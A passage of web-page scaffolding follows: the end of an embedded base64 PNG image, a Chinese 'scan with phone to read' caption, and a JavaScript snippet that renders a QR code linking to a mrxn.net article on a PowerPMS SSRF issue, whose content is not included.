+wcxl69Xg7zHIw6hFsn9n3VC+9PSN3CG61tIE4Nxqmqe2Z5x5WvDum7qjMnQvIQVL9Sb8YaEdKr+3BNh+Tst8Lev/NVXenbQIrc6/U3sPwtC8a3wSlDdBixfysQX73Xq4v6ZwhjX+v3CGOm94T4ENS3R+eQ3Mpf6b2POUg/CJorvD8h3tKb4PK3LM8HmaK8prhfXV9xGPuYEyE+BNVFiO7eEK5fqCeWVguO2dL/9YLsC0H36+dTL7w/IXULb7QOA+nTk0OmDEG/h+6rdzT348ePj/8rcH31FYfs13Pmv4KQXr0GokOw+6u9uw6ph+CZ7z6QPHD/A9Xjzb62T0ifphwyPc+90vUheZijuY6rvl2H9O31M27tV9Fe1sH1Pat2VacuVravbSDduPlrbmD7cwiMbwGM3ONB9D5luWi+c0g9zHGVVxd7/9IhPfU6wuhDOARX+eq9X5A8BM/q9CF5CKrv8f6E7G/jDZ63gfgGeKYV7zpk2hC8Wt/7dN77wPP+5vcIqYGgHoSv9jTXfRjrui8XYZ7Xn+E2EA9x42tvYBsIZJoQXB0L4kPQKfc8xIfn2OthnjcHo7/ft2fkK4T02vfYP8Po2wdG3RqIDkF1EaLDGreBWHTja29g+7sspy+ujnXmr+rOdMhbY67vA/FXOsQHPv4moHIQzZ4dK1NLHZKHYHm1INxcabXkYmmzBanv3qzu/oR4K2+Cyz+H9PNBpgxBpw0jt05/xdVXCGPf3s869UI1GGu7DvEhWLW1zNVzLYivDuEw4spXF2Fep194f0LqFt5obT9DPBOMU6w3ZbYgOT3rz/Bqvucg+531L7/XljZbPbfiZ3r33Qty5u53br7w/oTULbzR2n6GeCanJ6pDpg3B7l/NwVgP4daLMOp9PzkkB1i6IfDxP7KG4Gb8eoBrOjzPQXzP9Kv9AVY+pB64/z3k8WZfh//Kgs9pAdtxna4IfLx9BmDkK916fbHrchj7wsitL7SmnvdLfYWQnhA0Zw+5+FUd0heCq/rqfxiI4RtfcwOH37I8Rk2rllyETLm8Wuody6ulDqmDoHplask7ller6zD2KR+iQbC02YL4EKz++2UNxIcRz3yY593DehE+8/cnxFt5E9x+y3J64up83YdM9yzf68zD83pzHe03Q7N6kD0gqG4OokNQ3VzH7ne+ypvruM/fn5B+Oy/m288QyNsB19BzO90Vh7GfuasIqV/lIT5wiAAfvwl6RtGgvKM+pB5G1F8hJN99GHUIh0+8PyH91l7Mt4H0t2TFV+c1rw+Zuvwq2gfGehi5/cwXqnWEsRau8eq5X/aF1ENQXbRGLnZdvsdtIBbd+NobOAwEMnUYcXVMmOf2U589Q+pWfc90SD0c0dq+LySrDnNuPcSHoPoKITkYsedh7R8G0otv/r038NcG4lvn8SFvgXyF1sGYV1/hql/p1tRzLUhvdRh5ZfbLnLj36rnrnVem1kpXFyHnAe6/7X282ddf+4ScfV+Qt6DnILpviz5EhxH1Rev2qAeplYtmYe7DqJsXIX7n9u+4ykH67PPfNpD9pvfz+gYOA3GaHVctzEGmDcGur/iqb9et7zpkPzhir4FkVj3MizDm4Tm3zv6QPATVxZ4v/TCQEu/1uhvYBgKZIjzH1VH7tCF9zEO4OZhz82LPq8/QrB5kD7k+zHVzHWHM69tPLqp31If0g6B64TaQIvd6/Q3cA3n9DIYT/A8AAP//rY02hgAAAAZJREFUAwDFMFLaPRGU1gAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/powerpms-FormXml-DocFile-OfficeService-SSRF.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 